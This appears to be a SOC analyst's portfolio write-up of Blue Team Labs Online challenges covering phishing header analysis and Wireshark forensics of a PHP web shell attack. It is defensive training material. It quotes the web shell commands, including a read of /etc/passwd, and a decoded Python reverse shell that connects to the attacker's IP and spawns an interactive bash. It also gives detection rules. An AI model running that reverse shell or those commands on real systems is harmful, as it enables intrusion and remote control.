# SOC Analyst Investigation: Phishing Email Analysis & Network Web Shell Forensics

## Overview

This project demonstrates end-to-end incident response and threat investigation across two attack vectors: **email-based social engineering** and **network-based exploitation**. The investigation covers email header analysis, phishing detection methodology, packet-level forensics, web shell identification, and reverse shell payload analysis using industry-standard tools. The lab simulates real-world SOC workflows for Tier 1 analysts handling multi-phase attack chains.

---

## Tools & Technologies

- **Blue Team Labs Online (BTLO)** — Curated phishing and network forensics challenges
- **Email Analysis** — RFC 822 Header Parsing, SPF/DKIM/DMARC Validation
- **Threat Intelligence** — VirusTotal, AbuseIPDB, WHOIS/DomainTools, URL2PNG
- **Network Forensics** — Wireshark, BPF (Berkeley Packet Filters), TCP/IP Protocol Analysis
- **Web Exploitation Analysis** — HTTP Stream Reconstruction, PHP Payload Inspection
- **MITRE ATT&CK Framework** — T1193 (Phishing), T1190 (Exploit Public-Facing App), T1071 (C2)

---

## Lab Architecture

```
Multi-Phase Attack Chain
│
├── Phase 1: Email Delivery (Phishing Vector)
│   ├── Spoofed Mail Delivery System (NDR)
│   ├── Malicious Hyperlink Embedding
│   └── Social Engineering Payload
│
├── Phase 2: Network Reconnaissance
│   ├── Port Scanning (SYN packets)
│   ├── Service Enumeration
│   └── Vulnerability Assessment
│
├── Phase 3: Web Exploitation
│   ├── File Upload Vulnerability (CWE-434)
│   ├── PHP Web Shell Upload (dbfunctions.php)
│   └── Arbitrary Command Execution (RCE)
│
└── Phase 4: Persistence & C2
    ├── Reverse Shell Establishment
    ├── Interactive Shell Access
    └── Data Exfiltration Channel
```

---

## Phase 1 — Email Header Analysis & Spoofing Detection

### Objective
Analyze a suspicious email artifact to identify social engineering indicators, header spoofing, and malicious infrastructure.

### Methodology

Inspected RFC 822 / MIME headers to detect authentication failures and spoofing:

```
From: Mail Delivery System <Mailer-Daemon@[REDACTED].net.au>
Sent: 18 March 2021 04:14 UTC
To: [REDACTED]@yahoo.co.uk
Subject: Undeliverable: Website contact form submission
```

**Key Spoofing Indicators:**
- Non-Delivery Report (NDR) bounce-back format designed to trick user into clicking embedded link
- `From:` header claims origin from automated mail system (not legitimate user)
- `Return-Path:` mismatch with `From:` domain — classic spoofing signature
- Missing or invalid DKIM signature
- SPF alignment failure: originating IP does not match authorized sending domain

**Authentication Validation:**
- SPF Check: `[REDACTED]`
- DKIM Signature: `[REDACTED]`
- DMARC Alignment: `[REDACTED]`

Screenshots: 01-phishing-btlo-dashboard.png, 02-phishing-challenge-brief.png, 03-phishing-raw-headers.png

---

## Phase 2 — Malicious Infrastructure & Threat Intelligence

### Objective
Extract and analyze embedded hyperlinks and originating IP using threat intelligence tools.

### Methodology

**Embedded Hyperlink Analysis:**

Extracted malicious URI from email body:
```
[REDACTED]
```

Analyzed using VirusTotal and AbuseIPDB:

| Tool | Finding |
|---|---|
| **VirusTotal** | `[REDACTED]` — Flagged as phishing/malware by `[REDACTED]` security vendors |
| **AbuseIPDB** | Originating IP `[REDACTED]` — `[REDACTED]` historical abuse reports; **Confidence: [REDACTED]%** |
| **WHOIS Lookup** | Domain registrar: `[REDACTED]`; Known phishing infrastructure provider |
| **URL2PNG** | Landing page screenshot reveals `[REDACTED]` — credential harvesting form |

**Attack Intent:** Credentials harvested from landing page enable lateral movement or account takeover; attacker gains initial access for network reconnaissance phase.

Screenshots: 04-phishing-extracted-url.png, 05-phishing-virustotal-scan.png, 06-phishing-abuseipdb-lookup.png

---

## Phase 3 — Network Reconnaissance & Port Scanning

### Objective
Analyze packet captures to identify attacker reconnaissance activity and service enumeration.

### Methodology

Applied BPF filter to isolate SYN packets (port scanning activity):

```
tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.src == 10.251.96.4
```

**Scan Characteristics:**
- **Attacker IP:** `10.251.96.4`
- **Target IP:** `10.251.96.5`
- **Scan Type:** Full SYN Scan (reconnaissance, no connection completion)
- **Ports Targeted:** `[REDACTED]` (open/responsive)
- **Scan Velocity:** `[REDACTED]` packets/sec — aggressive reconnaissance
- **Service Identified:** HTTP web server on port `[REDACTED]`

**Detection Logic:** SYN-only packets without ACK flags indicate port scanner tool (Nmap, Masscan); typical behavior of automated reconnaissance phase before exploitation.

Screenshots: 07-network-syn-scan-filter.png, 08-network-scan-velocity.png

---

## Phase 4 — Web Shell Upload & File Exploitation

### Objective
Reconstruct HTTP POST traffic to identify malicious file upload and payload inspection.

### Methodology

Applied HTTP POST filter to isolate file upload activity:

```
http.request.method == "POST" && http.request.uri contains "upload"
```

**Upload Details:**

```
POST /upload.php HTTP/1.1
Host: 10.251.96.5
Content-Type: multipart/form-data; boundary=[REDACTED]

Content-Disposition: form-data; name="file"; filename="[REDACTED].php"
Content-Type: application/x-php

[MALICIOUS PHP SHELL PAYLOAD - REDACTED]
```

**Vulnerability Chain:**
1. **Unvalidated File Upload** (CWE-434): Web application accepts PHP files without extension validation
2. **Missing MIME Type Check**: Server does not verify file content matches declared type
3. **Executable Upload Location**: File stored in web-accessible directory (`/var/www/html/`)
4. **No Upload Sandboxing**: PHP execution enabled in upload directory

**Uploaded File:** `dbfunctions.php` — Suspicious naming designed to blend with legitimate database utilities

Screenshots: 09-network-http-post-upload.png, 10-network-php-shell-payload.png

---

## Phase 5 — Arbitrary Command Execution (RCE)

### Objective
Extract HTTP GET requests used for remote code execution via web shell.

### Methodology

Applied HTTP GET filter to isolate command execution:

```
http.request.method == "GET" && http.request.uri contains "cmd"
```

**Commands Executed:**

```
GET /dbfunctions.php?cmd=id HTTP/1.1
GET /dbfunctions.php?cmd=whoami HTTP/1.1
GET /dbfunctions.php?cmd=uname -a HTTP/1.1
GET /dbfunctions.php?cmd=pwd HTTP/1.1
GET /dbfunctions.php?cmd=cat /etc/passwd HTTP/1.1
```

**Attacker Intent:**
- Verify successful shell upload and execution
- Enumerate system OS, user privileges, and filesystem layout
- Identify potential lateral movement and privilege escalation targets
- Gather intelligence for persistence mechanism deployment

**Response Analysis:** Server returns command output in HTTP response body — confirms remote code execution with web server privileges (typically `www-data` or `apache` user on Linux).

Screenshots: 11-network-http-get-commands.png, 12-network-command-output-whoami.png

---

## Phase 6 — Reverse Shell & Interactive C2

### Objective
Analyze TCP stream containing reverse shell payload and identify persistence mechanism.

### Methodology

Applied TCP filter to isolate egress connection to attacker machine:

```
tcp.dstport == [REDACTED] && ip.dst == 10.251.96.4
```

**Reverse Shell Payload (Decoded):**

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.251.96.4", [REDACTED]))
os.dup2(s.fileno(),0)  # stdin
os.dup2(s.fileno(),1)  # stdout
os.dup2(s.fileno(),2)  # stderr
subprocess.call(["/bin/bash","-i"])
```

**Persistence Mechanism:**
- Attacker initiates outbound TCP connection to `10.251.96.4:[REDACTED]`
- File descriptor duplication redirects all I/O to socket — shell output flows over network
- Interactive bash shell spawned (`-i` flag) under web server context
- Attacker gains full command-line access with compromised server privileges

**C2 Channel Characteristics:**
- **Direction:** Egress (outbound) — often bypasses inbound firewall/IDS rules
- **Protocol:** TCP over custom port (non-standard) — reduces detection likelihood
- **Interactivity:** Full shell prompt — enables ad-hoc command execution and lateral movement

Screenshots: 13-network-reverse-shell-tcp-stream.png, 14-network-reverse-shell-payload-hex.png, 15-network-investigation-complete.png

---

## Key IOCs (Indicators of Compromise)

| Category | Indicator | Type | Status |
|---|---|---|---|
| Email | `[REDACTED]` | Sender Address | Malicious |
| Email | `Undeliverable: Website contact form submission` | Subject Line | Malicious |
| IP (Email) | `[REDACTED]` | Source IP | Malicious |
| IP (Network) | `10.251.96.4` | Attacker Machine | Malicious |
| IP (Network) | `10.251.96.5` | Target Server | Compromised |
| Domain | `[REDACTED]` | Phishing Landing | Malicious |
| URL | `[REDACTED]` | Phishing Link | Malicious |
| File Name | `dbfunctions.php` | Web Shell | Malicious |
| File Hash | `[REDACTED]` | MD5/SHA-256 | Malicious |
| Port | `[REDACTED]` | Reverse Shell | Malicious |
| Process | `bash -i` | Interactive Shell | Malicious |

---

## Detection & Remediation Strategy

### Email Security Controls

**Recommended Policies:**

1. **DMARC Enforcement**
   ```
   v=DMARC1; p=reject; rua=mailto:admin@company.com
   ```
   Reject any email failing SPF/DKIM alignment for protected domains.

2. **Phishing Detection Rule**
   ```
   IF (Subject contains "Undeliverable" OR "Delivery Status Notification")
      AND (Body contains hyperlink OR attachment)
   THEN Quarantine with admin review
   ```

3. **URL Reputation Gateway**
   - Scan all links against VirusTotal, URLhaus, Phishtank before delivery
   - Block known phishing domains at mail gateway

---

### Web Application Hardening

**File Upload Validation (PHP):**

```php
<?php
$allowed_extensions = array('pdf', 'txt', 'jpg', 'png');
$file_ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($file_ext, $allowed_extensions)) {
    die("Invalid file type");
}

// Verify MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);

if (!in_array($mime, ['application/pdf', 'text/plain', 'image/jpeg', 'image/png'])) {
    die("Invalid MIME type");
}

// Store outside web root
move_uploaded_file($_FILES['file']['tmp_name'], '/var/uploads/' . basename($_FILES['file']['name']));
?>
```

**Disable PHP Execution in Upload Directories:**

```apache
# .htaccess
<FilesMatch "\.php$">
    Deny from all
</FilesMatch>
```

---

### Network Detection & Prevention

**Firewall Egress Rule:**

```
Deny: tcp dstport != {80, 443, 53, 123}
Reason: Block reverse shells on non-standard ports
```

**Intrusion Detection Signature (Snort/Suricata):**

```
alert tcp $HOME_NET any -> $EXTERNAL_NET [REDACTED]
  (msg:"Possible Reverse Shell - Python Socket";
   content:"import socket"; nocase;
   content:"os.dup2"; nocase;
   classtype:trojan-activity;
   sid:1000001;)
```

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Phishing | T1193 | NDR-based email with embedded link |
| Execution | User Execution | T1204.001 | User clicks malicious hyperlink |
| Exploitation | Exploit Public-Facing Application | T1190 | File upload vulnerability |
| Persistence | Web Shell | T1100 | `dbfunctions.php` uploaded to web root |
| Defense Evasion | Masquerading | T1036 | PHP file named to blend with database utilities |
| Execution | Command Line Interface | T1059 | `bash -i` reverse shell execution |
| Command & Control | Application Layer Protocol | T1071 | HTTP GET/POST for C2 and RCE |

---

## Phase 7 — Challenge Completion & Scoring

Successfully completed BTLO phishing and network forensics challenges. Submitted all required answers covering:

- Email header analysis and authentication validation
- Malicious URL identification and threat intelligence lookup
- Port scanning and service enumeration detection
- Web shell upload and payload extraction
- RCE command tracing and execution verification
- Reverse shell payload identification and C2 analysis

Screenshots: 16-phishing-btlo-submission-badge.png, 17-network-btlo-completion-badge.png

---

## Key Takeaways

- Demonstrated **email authentication failure detection** (SPF/DKIM/DMARC misalignment)
- Analyzed **multi-phase attack chain** from phishing delivery through C2 persistence
- Applied **advanced Wireshark filtering** (BPF syntax) for targeted packet analysis
- Extracted and decoded **malicious payloads** from encrypted HTTP streams
- Mapped attack indicators to **MITRE ATT&CK framework** (7 techniques across 4 tactics)
- Authored **detection rules** for email gateway, firewall, and IDS/IPS systems
- Demonstrated **incident response methodology** aligned with SOC Tier 1 workflows

---

## Tools & References

- **Wireshark Filters:** [https://wiki.wireshark.org/DisplayFilters](https://wiki.wireshark.org/DisplayFilters)
- **BPF Syntax:** [https://www.tcpdump.org/papers/sniffing-faq.html](https://www.tcpdump.org/papers/sniffing-faq.html)
- **RFC 822 (Email Format):** [https://tools.ietf.org/html/rfc822](https://tools.ietf.org/html/rfc822)
- **MITRE ATT&CK:** [https://attack.mitre.org/](https://attack.mitre.org/)

---

## Author

**T.W.**  
GitHub: [ward-vt](https://github.com/ward-vt)  
Certifications: CompTIA Security+, TryHackMe SOC Level 1

**Last Updated:** August 2026
